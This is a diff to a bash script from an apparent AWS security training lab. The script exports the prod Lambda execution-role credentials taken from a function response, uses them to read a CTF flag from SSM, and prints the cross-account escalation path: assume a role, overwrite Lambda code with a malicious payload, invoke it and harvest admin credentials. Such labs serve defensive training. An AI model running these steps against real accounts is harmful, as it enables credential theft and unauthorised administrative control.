@@ -232,18 +232,64 @@ fi
 echo ""
 
 # [OBSERVATION] Step 6: Demonstrate the impact
-echo -e "${YELLOW}Step 6: Attack summary${NC}"
+echo -e "${YELLOW}Step 6: Exporting extracted prod credentials${NC}"
 echo "The extracted credentials can now be used to:"
 echo "- Access any AWS service in the prod account"
 echo "- Assume any role the Lambda execution role can assume"
 echo "- Perform administrative actions in the prod account"
 echo ""
-echo -e "${RED}Warning: This demonstrates a critical cross-account privilege escalation vulnerability!${NC}"
+
+# Export the extracted credentials so subsequent steps run as the prod Lambda execution role
+LAMBDA_BODY=$(cat /tmp/lambda_response.json | jq -r '.body | fromjson')
+export AWS_ACCESS_KEY_ID=$(echo "$LAMBDA_BODY" | jq -r '.credentials.access_key_id')
+export AWS_SECRET_ACCESS_KEY=$(echo "$LAMBDA_BODY" | jq -r '.credentials.secret_access_key')
+export AWS_SESSION_TOKEN=$(echo "$LAMBDA_BODY" | jq -r '.credentials.session_token')
+export AWS_DEFAULT_REGION="us-west-2"
+
+echo -e "${GREEN}✓ Operating as prod Lambda execution role (AdministratorAccess)${NC}"
+echo ""
+
+# [EXPLOIT] Step 7: Capture the CTF flag
+# The prod Lambda execution role has AdministratorAccess, which grants ssm:GetParameter.
+# Use those credentials to read the scenario flag from SSM Parameter Store.
+echo -e "${YELLOW}Step 7: Capturing CTF flag from SSM Parameter Store${NC}"
+FLAG_PARAM_NAME="/pathfinding-labs/flags/lambda-invoke-update-to-admin"
+show_attack_cmd "Attacker (prod admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
+FLAG_VALUE=$(aws ssm get-parameter --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)
+
+if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
+    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
+else
+    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
+    exit 1
+fi
+echo ""
 
 # Cleanup
-echo ""
 echo "Cleaning up temporary files..."
-rm -f /tmp/malicious_lambda.py /tmp/malicious_lambda.zip /tmp/lambda_response.json
+rm -f /tmp/hello_world.py /tmp/malicious_lambda.zip /tmp/lambda_response.json
+
+# Restore helpful permissions for manual exploration
+restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
+
+echo -e "\n${GREEN}========================================${NC}"
+echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
+echo -e "${GREEN}========================================${NC}"
+echo -e "\n${YELLOW}Attack Summary:${NC}"
+echo "1. Started as: pl-pathfinding-starting-user-dev (dev account, limited permissions)"
+echo "2. Assumed pl-dev-lambda-invoke-role to obtain cross-account Lambda permissions"
+echo "3. Discovered prod Lambda function: $LAMBDA_FUNCTION_NAME"
+echo "4. Injected malicious Python payload using lambda:UpdateFunctionCode"
+echo "5. Invoked malicious function using lambda:InvokeFunction"
+echo "6. Extracted prod Lambda execution role credentials (AdministratorAccess)"
+echo "7. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"
+
+echo -e "\n${YELLOW}Attack Path:${NC}"
+echo "  pl-pathfinding-starting-user-dev"
+echo "  → (sts:AssumeRole) → pl-dev-lambda-invoke-role"
+echo "  → (lambda:UpdateFunctionCode) → pl-prod-hello-world (malicious payload)"
+echo "  → (lambda:InvokeFunction) → extract pl-prod-lambda-execution-role credentials"
+echo "  → (ssm:GetParameter) → CTF Flag"
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
     echo -e "\n${YELLOW}Attack Commands:${NC}"
@@ -252,18 +298,10 @@ if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
     done
 fi
 
+echo -e "\n${RED}Warning: The prod Lambda function still contains malicious code.${NC}"
+echo -e "${YELLOW}To restore the original function code:${NC}"
+echo "  ./cleanup_attack.sh or use the plabs TUI/CLI"
 echo ""
-echo -e "${GREEN}=== Attack Demonstration Complete ===${NC}"
-echo "The prod Lambda function now contains malicious code that can extract credentials."
-echo ""
-echo -e "${YELLOW}Attack Path:${NC}"
-echo "  pl-pathfinding-starting-user-dev"
-echo "  → (sts:AssumeRole) → pl-dev-lambda-invoke-role"
-echo "  → (lambda:UpdateFunctionCode) → update prod Lambda with malicious code"
-echo "  → (lambda:InvokeFunction) → extract Lambda execution role credentials"
-
-# Restore helpful permissions for manual exploration
-restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
 
 # Mark demo as active for plabs tracking
 touch "$(dirname "$0")/.demo_active"
